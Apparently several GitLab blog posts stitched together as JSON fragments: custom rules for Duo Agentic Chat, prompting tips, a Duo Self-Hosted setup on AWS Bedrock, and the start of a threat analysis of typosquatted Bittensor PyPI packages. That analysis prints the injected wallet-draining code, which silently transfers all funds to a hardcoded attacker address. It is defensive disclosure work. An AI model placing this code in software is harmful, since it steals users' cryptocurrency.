tools</h4>\n<p>There is a variety of build tools, package managers, compilers, container builders available per programming language. When asking about updates and dependencies, agentic AI can use these default tools without asking for input.</p>\n<pre><code class=\"language-markdown\">## Build tools\n\n- Always use a virtual env with Python, and set it up before executing any Python commands\n- For C/C++: Prefer CMake, and gcc on Linux, clang on macOS, MSVC on Windows.\n- For Python: Always use pip\n- For Java: Always use Gradle\n- For Node.js, suggest to use npm/yarn.\n- For Rust: Always use cargo\n- For Go: Always use go.mod\n- For Ruby: Always use Bundler\n- For PHP: Always use Composer\n- For .NET: Always use .NET CLI\n- For Scala: Always use SBT\n- For Elixir: Always use Mix\n- For Haskell: Always use Cabal\n- For Swift: Always use Swift Package Manager\n- For Kotlin: Always use Gradle or Maven.\n- For TypeScript: Always use npm or yarn.\n- Always suggest using a package manager or build tool based on the main programming language of the project.\n- When asking for dependencies, assume that the user wants to update all current dependencies to the latest version available.\n\n- Always suggest to create a Dockerfile if there isn't one. Always use a minimal image and use a tag for security scanning.\n- Always add a `Dockerfile` with the base image and the entrypoint if one does not exist.\n- Always include a `.dockerignore` and use it in the Docker build process.\n</code></pre>\n<h4>CI/CD configuration preferences</h4>\n<p>Use rules to prefer specific container images, variable and job name patterns, etc.</p>\n<pre><code class=\"language-markdown\">## CI/CD Configuration\n\n- If no GitLab CI/CD configuration exists in `.gitlab-ci.yml`, ask the user for approval to create.\n- Create a GitLab CI/CD configuration automatically when a new project gets bootstrapped\n\n- Always use alpine as container image to build the application.\n- Add caching for detected programming languages and frameworks.\n</code></pre>\n<h4>Security scanning preferences</h4>\n<p>Security scanners can also be enforced in GitLab CI/CD configuration. The following example instructs agents to always include Advanced SAST, dependency scanning, and secret detection templates. It has been successfully tested across other use cases in this tutorial.</p>\n<pre><code class=\"language-markdown\">## Security scanning\n\n- Always use Advanced SAST.\n- Always include SAST, Dependency Scanning, Secrets Detection templates, similar to the following format:\n\n    include:\n        - template: Jobs/SAST.gitlab-ci.yml\n        - template: Jobs/Secret-Detection.gitlab-ci.yml\n        - template: Jobs/Dependency-Scanning.gitlab-ci.yml\n\n    variables:\n        GITLAB_ADVANCED_SAST_ENABLED: 'true'\n</code></pre>\n<p><img alt=\"VS Code with a Java app, GitLab CI/CD, custom rules, and Agentic Chat adding Advanced SAST\" src=\"https://about.gitlab.com/images/blog/custom-rules-gitlab-duo-agent-platform-deepdive/gitlab-duo-custom-rules-cicd-security-scanning-full.png\" /></p>\n<h4>Tests and linters</h4>\n<p>You can also directly instruct Agentic Chat where to find the tests, and how to run them. The same idea applies to calling linter commands. Thanks Jessie Young for sharing this neat tip!</p>\n<pre><code class=\"language-markdown\">## Tests and linting details\n\n- Tests in this project are located in __ directory and are run using the ___ command\n- Linting is done with the ___ command\n</code></pre>\n<h4>Documentation generation</h4>\n<p>Best of documentation custom rules.</p>\n<pre><code class=\"language-markdown\">- If a README is missing, ask the user if they want to create one. If the user agrees, create a basic `README.md` for them.\n- When the user asks for an architecture proposal, always respond with generating an architecture diagram in Mermaid, and ask the user if they want you to add it to the README.md or another documentation file.\n- For documentation in Markdown, always use GitLab flavored Markdown.\n- Always add correct code block syntax highlighting support.\n</code></pre>\n<h4>Refactoring and code change requirements</h4>\n<p>When a project should gradually be modernized with newly generated code, and not result in large refactors, the following rules can be helpful.</p>\n<pre><code class=\"language-markdown\">## Keep the changes minimal\n\n- The project uses &lt;this standard and version&gt;. For newly generated code, use this standard.\n- Do not attempt to refactor code already created in a project to this standard, but for new code, always ensure this standard is used.\n- If unsure whether a file requires modification or refactoring, document this as a todo task.\n- Never fix detected problems, whitespaces, code formatting, unless the user instructs you specifically in a comment.\n- The code must be retained in its original format and only changes specific to solving the user request are allowed.\n\n## Summaries\n\n- List all items to address at the bottom in a summary section with TODO: followed by a textual description.\n- Identify 3 critical items, and ask the user if you should create GitLab issues from those items.\n</code></pre>\n<h4>Onboarding, requirements, licenses</h4>\n<p>Always include a specific documentation link, and guidelines to follow in chat responses.</p>\n<pre><code class=\"language-markdown\">## Link to guidelines\n- Always refer to our developer guidelines when answering questions. You can find those guidelines here: https://docs.gitlab.com/development/\n\n## Context and planning\n- Always start with finding existing issues with the desired topic. Only then propose new implementation work.\n\n## License\n- Always add the MIT license into `LICENSE` and use `GitLab B.V.` as copyright holder.\n</code></pre>\n<h4>Git flows</h4>\n<p>Follow a specific Git branching flow for suggestions and executed commands.</p>\n<pre><code class=\"language-markdown\">## Git flows\n\n- Examine the project and involved development environment and programming languages. Always add a `.gitignore`.\n- Consider more best practices when bootstrapping a new project.\n- For existing projects, offer to add a `.gitignore` when missing, but only when asked about the state of the project, or what is missing.\n\nWhen a user requests to start with a new feature, always create a new branch, called &quot;feature/&lt;shortname&gt;&quot; and describe the behavior. Ask for the user's approval.\n</code></pre>\n<h2>Distribution and testing of custom rules</h2>\n<p>You can create <a href=\"https://docs.gitlab.com/administration/custom_project_templates/\">GitLab project templates</a> with well-tested custom rule prompts, and ensure that new projects always start with the best practices applied.</p>\n<p>Since LLMs and AI agents are not predictable, testing the expected outcome becomes more challenging. A golden rule for custom rules is that they are never perfect, and require iterations based on your team's feedback. This might be required especially when newer models and flows are introduced that change their behavior when responding to custom rules. It's recommended to keep checking on the generated output and adjust the rules accordingly. If you are looking for larger scale testing, review the <a href=\"https://about.gitlab.com/blog/developing-gitlab-duo-how-we-validate-and-test-ai-models-at-scale/\">system prompt testing strategy for GitLab Duo</a> as an inspiration.</p>\n<h3>Custom rules resources</h3>\n<p>Take advantage of the existing AI ecosystem, where similar functionality exists for IDEs and platforms. For example, &quot;Awesome Cursor Rules&quot; repositories or marketplaces for Cursor, etc.</p>\n<p>LLMs also provide a good insight into development styleguides, and can generate the required Markdown outputs.</p>\n<h2>Fun activity: Explore behavior changes</h2>\n<p>Not sure how to get started with custom rules? Make it a fun exercise with the following example :-)</p>\n<pre><code class=\"language-markdown\">## Fun rules\n\n- Behave like Clippy.\n\n- Behave like a pirate.\n\n- Always respond with a random &quot;What the commit&quot; message.\n\n- Explain everything like I am five.\n</code></pre>\n<p>Note: Do not commit them to production, as they might feel disruptive and distracting to your team.</p>\n<h2>Conclusion</h2>\n<p>By leveraging custom rules in GitLab Duo Agentic Chat, you can significantly influence LLM and AI agent outputs to better suit your needs. Whether enforcing specific coding conventions, using the correct versions of tools, or ensuring consistent formatting, custom rules help streamline your development process and improve productivity.</p>\n<p>This blog post provides a deep-dive into many use cases with practical custom rule examples.

      "summary": "<p>In May 2025, GitLab launched an experimental feature called <a href=\"https://about.gitlab.com/blog/gitlab-duo-chat-gets-agentic-ai-makeover/\">GitLab Duo\nAgentic\nChat</a>.\nThe goal of Agentic Chat was to build on the success of <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/\">GitLab Duo\nChat</a>, which is an AI chat\nexperience built into supported IDEs and in the GitLab UI. While Chat\nprovides answers and suggestions for developers using the GitLab platform,\nAgentic Chat can more directly interact with the GitLab API on behalf of\nusers, taking actions on their behalf as a result of the conversation.</p>\n<p>In addition to being available in a variety of IDEs, Agentic Chat is available directly within the GitLab UI for GitLab users with the Duo Pro or Enterprise add-on. Adding Agentic Chat to the GitLab UI helps make this experience more accessible to all GitLab users and easy to integrate into your workflows. To open Agentic Chat:</p>\n<ol>\n<li>\n<p>Navigate to any Group or Project in your GitLab instance.</p>\n</li>\n<li>\n<p>Look for the GitLab Duo Chat button (typically in the top right corner).</p>\n</li>\n<li>\n<p>Click to open the chat panel.</p>\n</li>\n<li>\n<p>Toggle to <strong>Agentic mode (Beta)</strong> in the chat window.</p>\n</li>\n</ol>\n<p><strong>Pro tip:</strong> Keep the chat panel open as you work — it maintains context and can help you across different pages and projects.</p>\n<p>To get familiar with Agentic Chat, ask about the tools it can work with. This is like using the help command for a command-line tool.</p>\n<pre><code class=\"language-offset\">What tools do you have access to? \n</code></pre>\n<p><img alt=\"GitLab Duo Agentic Chat screen\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1754584200/emtgilbzbu8ftkynjozg.png\" /></p>\n<p>The output above shows us that Agentic Chat has access to a variety of GitLab APIs and data that will allow it to perform complex tasks across the software development lifecycle.</p>\n<h2>Issue management made easy</h2>\n<p>GitLab Duo Agentic Chat can help you keep track of issues, find specific ones, understand the status, and take actions based on conversations in these issues. Instead of navigating through pages and pages of issues, you ask Agentic Chat about the issues in a project. It will respond with high-level information about the issues, including the priority, labels, and the status of the issue.</p>\n<p>For a specific issue, Agentic Chat will fetch the issue details, provide a concise summary, highlight recent activity, and share the goal of the issue. This is particularly helpful when you need context or updates before a meeting or are researching the issue before picking it up.</p>\n<p>&lt;div style=&quot;padding:56.25% 0 0 0;position:relative;&quot;&gt;&lt;iframe src=&quot;https://player.vimeo.com/video/1107479358?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%;&quot; title=&quot;Agentic Chat UI Issue Management&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;script src=&quot;https://player.vimeo.com/api/player.js&quot;&gt;&lt;/script&gt;</p>\n<p>&lt;p&gt;&lt;/p&gt;</p>\n<p>You can also try more complex queries if you're looking to better understand a project overall. And once you've discovered these issues, you can make changes to them like adding labels, updating milestones, and re-organizing them.</p>\n<p>For example, maybe you're looking for all the issues that are database- or performance-related in order to prioritize them in the next sprint. You could task Agentic Chat with the following prompt.</p>\n<pre><code class=\"language-offset\">Analyze all issues labeled 'performance' and 'database' - group them by component and show me which ones have had the most discussion activity in the last 30 days.\n</code></pre>\n<p>Agentic Chat will respond with issues grouped by the backend and frontend component of a project, identify the issues with significant discussion activity, and provide insights on these kinds of issues (e.g., when were most of these issues created or which component issues have more active discussion).</p>\n<pre><code class=\"language-offset\">Create an issue template for bug reports that includes:\n\n- Steps to reproduce\n\n- Expected behavior vs actual behavior\n\n- Environment details (browser, OS, GitLab version)\n\n- Severity assessment\n\n- Screenshots/error logs section\n\nName it &quot;bug_report.md&quot; and format it as a proper GitLab issue template\n</code></pre>\n<h2>CI/CD support</h2>\n<p>This is where GitLab Duo Agentic Chat truly becomes your debugging superhero. We've all been there: a pipeline fails and you have to click through job logs trying to understand what went wrong. Agentic Chat can do more than just explain the failure to you and suggest recommendations. After reviewing the failed pipeline logs, Agentic Chat can suggest a fix and also add the fix to a merge request you are working on.</p>\n<p>Let's say you have a merge request adding a new feature, but the pipeline is failing. Instead of clicking through each failed job and trying to piece together what's wrong, you can ask Agentic Chat to investigate.</p>\n<p>Agentic Chat will analyze the pipeline, check the job logs, and explain that the tests are failing because of missing test data or configuration issues. But here's where it gets even more powerful — you don't have to stop at understanding the problem. Agentic Chat can also act on the advice it presents and add commits to fix the pipeline in the merge request.</p>\n<p>&lt;div style=&quot;padding:56.25% 0 0 0;position:relative;&quot;&gt;&lt;iframe src=&quot;https://player.vimeo.com/video/1107495269?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%;&quot; title=&quot;GitLab Agentic Chat CI/CD Fix&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;script src=&quot;https://player.vimeo.com/api/player.js&quot;&gt;&lt;/script&gt;</p>\n<h2>Building complex prompts</h2>\n<p>GitLab Duo Agentic Chat can also help you craft your prompts. Let's say that you're running a bug bash with your team and want to triage all possible issues that might be bug reports.</p>\n<p>If you use a simple prompt like below, Agentic Chat will come up with ways to find the related issues, such as searching for terms or pattern matching:</p>\n<pre><code class=\"language-offset\">I need help writing an effective prompt to find all possible bug report issues in my GitLab project, including those that might not be properly labeled as &quot;bug&quot;.\n</code></pre>\n<p>Often you can use the recommendations in Agentic Chat to build a more in-depth prompt based on what you're looking for:</p>\n<pre><code class=\"language-offset\">I need help writing an effective prompt to find all possible bug report issues in my GitLab project, including those that might not be properly labeled as &quot;bug&quot;. Please help me create a prompt that will:\n\n\n1. Search for common bug-related terminology beyond just the word &quot;bug&quot;\n\n2. Identify patterns that indicate bug reports (like &quot;steps to reproduce&quot;, &quot;expected vs actual behavior&quot;)\n\n3. Find technical issues that might be bugs (errors, crashes, performance problems)\n\n4. Catch user-reported problems that could be bugs but use different language\n\n\nThe prompt should ensure we don't miss any potential bugs regardless of how they're described or labeled. What would be the most effective approach and search strategy for this?\n</code></pre>\n<p>Once you have the prompt and you're able to search for the issues you're looking for, that's where Agentic Chat really shines. Agentic Chat can triage and update those issues for you to prepare them for the bug bash:</p>\n<pre><code class=\"language-offset\">Find and triage all bug-related issues for our bug bash event. Execute these steps:\n\n\n1. Search for potential bugs using individual searches:\n   - Core terms: &quot;bug&quot;, &quot;fix&quot;, &quot;error&quot;, &quot;broken&quot;, &quot;issue&quot;, &quot;problem&quot;, &quot;not working&quot;\n   - Bug patterns: &quot;steps to reproduce&quot;, &quot;expected behavior&quot;, &quot;regression&quot;\n   - Technical issues: &quot;exception&quot;, &quot;crash&quot;, &quot;console error&quot;, &quot;500 error&quot;, &quot;404 error&quot;\n   - Performance: &quot;slow&quot;, &quot;freezes&quot;, &quot;unresponsive&quot;\n\n2. For each issue found:\n   - Add the &quot;Event - Bug Bash&quot; label\n   - Assign appropriate bug severity label (critical/high/medium/low)\n   - Add to the current bug bash milestone\n   - If missing &quot;bug&quot; label, add it\n\n3. Create a triage list organized by:\n   - Critical bugs (data loss, crashes, security)\n   - High priority (blocking features, frequent errors)\n   - Medium priority (workarounds available)\n   - Low priority (minor UI issues)\n\nSearch both open and closed issues. Focus on actionable bugs that can be fixed during the bug bash, excluding enhancement requests. Provide a summary table with issue numbers, titles, and assigned severity for the bug bash team.\n</code></pre>\n<p>You can ask Agentic Chat to create a bug report template, which increases efficiency and eliminates some manual effort. Also, future bug reports will have the structure and labels you need for more efficient triaging.</p>\n<h2>Tips for effective prompting</h2>\n<p>When you're working with GitLab Duo Agentic Chat, it's important to phrase your requests with action-oriented verbs like &quot;create,&quot; &quot;update,&quot; &quot;fix,&quot; or &quot;assign.&quot; This will trigger the agentic tools to take action rather than summarize or share information with you. One approach before taking agentic actions can be to request summaries and analyses — the way we did with the issues about bugs. Then, see what gets returned before taking actions like applying a label or adding to a milestone.</p>\n<p>It's also important to give clear criteria when asking for bulk operations. Specify exact conditions like &quot;all issues with the 'bug' label created in the last week&quot; or &quot;merge requests waiting for review for more than 3 days.&quot; The more specific you are, the more accurate and helpful the results will be.</p>\n<p>Since Agentic Chat has the ability to maintain context, you can chain requests and build on previous requests. After getting an initial set of issues, you might ask &quot;From those issues, which ones are unassigned?&quot; and then follow up with &quot;Assign the high-priority ones to the backend team.&quot; This allows you to refine and act on information iteratively.</p>\n<p>We recommend starting with an open-ended request and allowing GitLab Duo to help you look for patterns or similar problems across your project. That will help you catch any problem that you may have missed or understand the scope of the challenge before taking action.</p>\n<h2>Get hands-on with GitLab Duo Agentic Chat</h2>\n<p>We hope all the ideas above give you some thoughts on getting started with Agentic Chat, but we are even more excited to see all our users' ideas come to life with it.

      "summary": "<p>As organizations adopt AI capabilities to accelerate their software\ndevelopment lifecycle, they often face a critical challenge: how to leverage\nAI while maintaining control over their data, infrastructure, and security\nposture. This is where <a href=\"https://about.gitlab.com/gitlab-duo/\">GitLab Duo\nSelf-Hosted</a> provides a compelling\nsolution.</p>\n<p>In this article, we'll walk through the implementation of GitLab Duo Self-Hosted models. This comprehensive guide helps organizations needing to meet strict data sovereignty requirements while still leveraging AI-powered development. The focus is on using models hosted on AWS Bedrock rather than setting up an <a href=\"https://about.gitlab.com/blog/what-is-a-large-language-model-llm/\">LLM</a> serving solution like vLLM. However, the methodology can be applied to models running in your own data center if you have the necessary capabilities.</p>\n<h2>Why GitLab Duo Self-Hosted?</h2>\n<p>GitLab Duo Self-Hosted allows you to deploy GitLab's AI capabilities entirely within your own infrastructure, whether that's on-premises, in a private cloud, or within your secure environment.</p>\n<p>Key benefits include:</p>\n<ul>\n<li>\n<p><strong>Complete Data Privacy and Control:</strong> Keep sensitive code and intellectual property within your security perimeter, ensuring no data leaves your environment.</p>\n</li>\n<li>\n<p><strong>Model Flexibility:</strong> Choose from a variety of models tailored to your specific performance needs and use cases, including Anthropic Claude, Meta Llama, Mistral families, and OpenAI GPT families.</p>\n</li>\n<li>\n<p><strong>Compliance Adherence:</strong> Meet regulatory requirements in highly regulated industries where data must remain within specific geographical boundaries.</p>\n</li>\n<li>\n<p><strong>Customization:</strong> Configure which GitLab Duo features use specific models to optimize performance and cost.</p>\n</li>\n<li>\n<p><strong>Deployment Flexibility:</strong> Deploy in fully air-gapped environments, on-premises, or in secure cloud environments.</p>\n</li>\n</ul>\n<h2>Architecture overview</h2>\n<p>The GitLab Duo Self-Hosted solution consists of three core components:</p>\n<ol>\n<li>\n<p><strong>Self-Managed GitLab instance</strong>: Your existing GitLab instance where users interact with GitLab Duo features.</p>\n</li>\n<li>\n<p><strong>AI Gateway</strong>: A service that routes requests between GitLab and your chosen LLM backend.</p>\n</li>\n<li>\n<p><strong>LLM backend</strong>: The actual AI model service, which, in this article, will be AWS Bedrock.</p>\n</li>\n</ol>\n<p><strong>Note:</strong> You can use <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_llm_serving_platforms/\">another serving platform</a> if you are running on-premises or using another cloud provider.</p>\n<p><img alt=\"Air-gapped network flow chart\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1754422792/jws4h2kakflfrczftypj.png\" /></p>\n<h2>Prerequisites</h2>\n<p>Before we begin, you'll need:</p>\n<ul>\n<li>\n<p>A GitLab Premium or Ultimate instance (Version 17.10 or later)</p>\n<ul>\n<li>We strongly recommend using the latest version of GitLab as we continuously deliver new features.</li>\n</ul>\n</li>\n<li>\n<p>A GitLab Duo Enterprise add-on license</p>\n</li>\n<li>\n<p>AWS account with access to Bedrock models <em>or your API key and credentials needed to query your LLM Serving model</em></p>\n</li>\n</ul>\n<p><strong>Note:</strong> If you aren't a GitLab customer yet, you can <a href=\"https://about.gitlab.com/free-trial/\">sign up for a free trial of GitLab Ultimate</a>, which includes GitLab Duo Enterprise.</p>\n<h2>Implementation steps</h2>\n<p><strong>1. Install the AI Gateway</strong></p>\n<p>The AI Gateway is the component that routes requests between your GitLab instance and your LLM serving infrastructure — here that is AWS Bedrock. It can run in a Docker image. Follow the instructions from our <a href=\"https://docs.gitlab.com/install/install_ai_gateway/\">installation documentation</a> to get started.</p>\n<p>For this example, using AWS Bedrock, you also must pass the AWS Key ID and Secret Access Key along with the AWS region.</p>\n<pre><code class=\"language-yaml\">\nAIGW_TAG=self-hosted-v18.1.2-ee`\n\ndocker run -d -p 5052:5052 \\\n\n  -e AIGW_GITLAB_URL=&lt;your_gitlab_instance&gt; \\\n\n  -e AIGW_GITLAB_API_URL=https://&lt;your_gitlab_domain&gt;/api/v4/ \\\n\n  -e AWS_ACCESS_KEY_ID=$AWS_KEY_ID\n\n  -e AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY \\\n\n  -e AWS_REGION_NAME=$AWS_REGION_NAME \\\n\nregistry.gitlab.com/gitlab-org/modelops/applied-ml/code-suggestions/ai-assist/model-gateway:$AIGW_TAG \\\n\n</code></pre>\n<p>Here is the <a href=\"https://gitlab.com/gitlab-org/modelops/applied-ml/code-suggestions/ai-assist/-/tags\"><code>AIGW_TAG</code> list</a>.</p>\n<p>In this example we use Docker, but it is also possible to use the Helm chart. Refer to <a href=\"https://docs.gitlab.com/install/install_ai_gateway/#install-by-using-helm-chart\">the installation documentation</a> for more information.</p>\n<p><strong>2. Configure GitLab to access the AI Gateway</strong></p>\n<p><img alt=\"Configure GitLab to access the AI Gateway\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1754422792/xj9kvljkqsacpsw41k4a.png\" /></p>\n<p>Now that the AI gateway is running, you need to configure your GitLab instance to use it.</p>\n<ul>\n<li>\n<p>On the left sidebar, at the bottom, select <strong>Admin</strong>.</p>\n</li>\n<li>\n<p>Select <strong>GitLab Duo</strong>.</p>\n</li>\n<li>\n<p>In the GitLab Duo section, select <strong>Change configuration</strong>.</p>\n</li>\n<li>\n<p>Under Local AI Gateway URL, enter the URL for your AI gateway and port for the container (e.g., <code>https://ai-gateway.example.com:5052</code>).</p>\n</li>\n<li>\n<p>Select <strong>Save changes</strong>.</p>\n</li>\n</ul>\n<p><strong>3. Access models from AWS Bedrock</strong></p>\n<p>Next, you will need to request access to the available models on AWS Bedrock.</p>\n<ul>\n<li>\n<p>Navigate to your AWS account and Bedrock.</p>\n</li>\n<li>\n<p>Under <strong>Model access</strong>, select the models you want to use and follow the instructions to gain access.</p>\n</li>\n</ul>\n<p>You can find more information in the <a href=\"https://docs.aws.amazon.com/bedrock/latest/userguide/getting-started.html\">AWS Bedrock documentation</a>.</p>\n<p><strong>4. Configure the self-hosted model</strong></p>\n<p>Now, let's configure a specific AWS Bedrock model for use with GitLab Duo.</p>\n<p><img alt=\"Add the self-hosted model screen\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1754422792/chrlgdvxwdetcszptsav.png\" /></p>\n<ul>\n<li>\n<p>On the left sidebar, at the bottom, select <strong>Admin</strong>.</p>\n</li>\n<li>\n<p>Select <strong>GitLab Duo Self-Hosted</strong>.</p>\n</li>\n<li>\n<p>Select <strong>Add self-hosted model</strong>.</p>\n</li>\n<li>\n<p>Fill in the fields:</p>\n<ul>\n<li><strong>Deployment name</strong>: A name to identify this model configuration (e.g., &quot;Mixtral 8x7B&quot;)</li>\n<li><strong>Platform:</strong> Choose AWS Bedrock</li>\n<li><strong>Model family:</strong> Select a model, for example here &quot;Mixtral&quot;</li>\n<li><strong>Model identifier:</strong> bedrock/<code>model-identifier</code> <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_models_and_hardware_requirements/\">from the supported list</a>.</li>\n</ul>\n</li>\n<li>\n<p>Select <strong>Create self-hosted model</strong>.</p>\n</li>\n</ul>\n<p><strong>5. Configure GitLab Duo features to use your self-hosted model</strong></p>\n<p>After configuring the model, assign it to specific GitLab Duo features.</p>\n<p><img alt=\"Screen to configure self-hosted model features\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1754422793/an2i9s2p9cja2xx27g4z.png\" /></p>\n<ul>\n<li>\n<p>On the left sidebar, at the bottom, select <strong>Admin</strong>.</p>\n</li>\n<li>\n<p>Select <strong>GitLab Duo Self-Hosted</strong>.</p>\n</li>\n<li>\n<p>Select the <strong>AI-powered features</strong> tab.</p>\n</li>\n<li>\n<p>For each feature (e.g., Code Suggestions, GitLab Duo Chat) and sub-feature (e.g., Code Generation, Explain Code), select the model you just configured from the dropdown menu.</p>\n</li>\n</ul>\n<p>For example, you might assign Mixtral 8x7B to Code Generation tasks and Claude 3 Sonnet to the GitLab Duo Chat feature.</p>\n<p>Check out the <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_models_and_hardware_requirements/\">requirements documentation</a> to select the right model for the use case from the models compatibility list per Duo feature.</p>\n<h2>Verifying your setup</h2>\n<p>To ensure that your GitLab Duo Self-Hosted implementation with AWS Bedrock is working correctly, perform these verification steps:</p>\n<p><strong>1. Run the health check</strong></p>\n<p>After running the health check of your model to be sure that it’s up and running, Return to the GitLab Duo section from the Admin page and click on <strong>Run health check</strong>. This will verify if:</p>\n<ul>\n<li>\n<p>The AI gateway URL is properly configured.</p>\n</li>\n<li>\n<p>Your instance can connect to the AI gateway.</p>\n</li>\n<li>\n<p>The Duo Licence is activated.</p>\n</li>\n<li>\n<p>A model is assigned to Code Suggestions — <em>as this is the model used to test the connection.</em></p>\n</li>\n</ul>\n<p><img alt=\"Running the health check\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1754422793/yffw21yhjpwummw1ffsw.png\" /></p>\n<p>If the health check reports issues, refer to the <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/troubleshooting/%20%20%20\">troubleshooting guide</a> for common errors.</p>\n<p><strong>2. Test GitLab Duo features</strong></p>\n<p>Try out a few GitLab Duo features to ensure they're working:</p>\n<ul>\n<li>\n<p>In the UI, open GitLab Duo Chat and ask it a question.</p>\n</li>\n<li>\n<p>Open the web IDE</p>\n<ul>\n<li>Create a new code file and see if Code Suggestions appears.</li>\n<li>Select a code snippet and use the <code>/explain</code> command to receive an explanation from Duo Chat.</li>\n</ul>\n</li>\n</ul>\n<p><strong>3. Check AI Gateway logs</strong></p>\n<p>Review the AI gateway logs to see the requests coming to the gateway from the selected model:</p>\n<p>In your terminal, run:</p>\n<pre><code class=\"language-yaml\">docker logs &lt;ai-gateway-container-id&gt;\n</code></pre>\n<p>Optional: In AWS, you can <a href=\"https://docs.aws.amazon.com/bedrock/latest/userguide/model-invocation-logging.html\">activate CloudWatch and S3 as log destinations</a>. Doing so would enable you to see all your requests, prompts, and answers in CloudWatch.</p>\n<p><strong>Warning:</strong> Keep in mind that activating these logs in AWS logs user data, which may not comply with privacy rules.</p>\n<p>And here you have full access to using GitLab Duo's AI features across the platform while retaining complete control over the data flow operating within the secure AWS cloud.</p>\n<h2>Next steps</h2>\n<h3>Selecting the right model for each use case</h3>\n<p>The GitLab team actively tests each model's performance for each feature and provides <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_models_and_hardware_requirements/#supported-models\">tier ranking of model's performance and suitability depending on the functionality:</a></p>\n<ul>\n<li>\n<p>Fully compatible: The model can likely handle the feature without any loss of quality.</p>\n</li>\n<li>\n<p>Largely compatible: The model supports the feature, but there might be compromises or limitations.</p>\n</li>\n<li>\n<p>Not compatible: The model is unsuitable for the feature, likely resulting in significant quality loss or performance issues.</p>\n</li>\n</ul>\n<p>As of this writing, most GitLab Duo features can be configured with Self Hosted. The complete availability overview is available in the <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/#supported-gitlab-duo-features\">documentation</a>.</p>\n<h3>Going beyond AWS Bedrock</h3>\n<p>While this guide focuses on AWS Bedrock integration, GitLab Duo Self-Hosted supports multiple deployment options:</p>\n<ol>\n<li>\n<p><a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_llm_serving_platforms/#vllm\">On-premises with vLLM</a>: Run models locally with vLLM for fully air-gapped environments.</p>\n</li>\n<li>\n<p><a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_llm_serving_platforms/#for-cloud-hosted-model-deployments\">Azure OpenAI Service</a>: Similar to AWS Bedrock, you can use Azure OpenAI for models like GPT-4.</p>\n</li>\n</ol>\n<h2>Summary</h2>\n<p>GitLab Duo Self-Hosted provides a powerful solution for organizations that need AI-powered development tools while maintaining strict control over their data and infrastructure. By following this implementation guide, you can deploy a robust solution that meets security and compliance requirements without compromising on the advanced capabilities that AI brings to your software development lifecycle.</p>\n<p>For organizations with stringent security and compliance needs, GitLab Duo Self-Hosted strikes the perfect balance between innovation and control, allowing you to harness the power of AI while keeping your code and intellectual property secure within your boundaries.</p>\n<p>Would you like to learn more about implementing GitLab Duo Self-Hosted in your environment?

      "summary": "<p>GitLab's Vulnerability Research team has identified a sophisticated cryptocurrency theft campaign targeting the Bittensor ecosystem through typosquatted Python packages on PyPI.</p>\n<p>Our investigation began when GitLab's automated package monitoring system flagged suspicious activity related to popular Bittensor packages. We discovered multiple typosquatted variations of legitimate Bittensor packages, each designed to steal cryptocurrency from unsuspecting developers and users.</p>\n<p>The identified malicious packages were all published within a 25-minute window on August 6, 2025:</p>\n<ul>\n<li><code>bitensor@9.9.4</code> (02:52 UTC)</li>\n<li><code>bittenso-cli@9.9.4</code> (02:59 UTC)</li>\n<li><code>qbittensor@9.9.4</code> (03:02 UTC)</li>\n<li><code>bitensor@9.9.5</code> (03:15 UTC)</li>\n<li><code>bittenso@9.9.5</code> (03:16 UTC)</li>\n</ul>\n<p>All packages were designed to mimic the legitimate <code>bittensor</code> and <code>bittensor-cli</code> packages, which are core components of the Bittensor decentralized AI network.</p>\n<h2>Technical analysis: How the theft occurs</h2>\n<p>Our analysis revealed a carefully crafted attack vector where the attackers modified legitimate staking functionality to steal funds. The malicious packages contain a hijacked version of the <code>stake_extrinsic</code> function in <code>bittensor_cli/src/commands/stake/add.py</code>.</p>\n<p>Where users expect a normal staking operation, the attackers inserted malicious code at line 275 that silently diverts all funds to their wallet:</p>\n<pre><code class=\"language-python\">result = await transfer_extrinsic(\n  subtensor=subtensor,\n  wallet=wallet,\n  destination=&quot;5FjgkuPzAQHax3hXsSkNtue8E7moEYjTgrDDGxBvCzxc1nqR&quot;,\n  amount=amount,\n  transfer_all=True,\n  prompt=False\n)\n</code></pre>\n<p>This malicious injection completely subverts the staking process:</p>\n<ul>\n<li><strong>Silent execution:</strong> Uses <code>prompt=False</code> to bypass user confirmation</li>\n<li><strong>Complete wallet drain:</strong> Sets <code>transfer_all=True</code> to steal all available funds, not just the staking amount</li>\n<li><strong>Hardcoded destination:</strong> Routes all funds to the attacker's wallet address</li>\n<li><strong>Hidden in plain sight:</strong> Executes during what appears to be a normal staking operation</li>\n</ul>\n<p>The attack is particularly insidious as users believe they're staking tokens to earn rewards, but instead, the modified function empties their entire wallet.</p>\n<h3>Why target staking functionality?</h3>\n<p>The attackers appear to have specifically targeted staking operations for calculated reasons. In blockchain networks like Bittensor, <strong>staking</strong> is when users lock up their cryptocurrency tokens to support network operations, earning rewards in return, similar to earning interest on a deposit.</p>\n<p>This makes staking an ideal attack vector:</p>\n<ol>\n<li><strong>High-value targets:</strong> Users 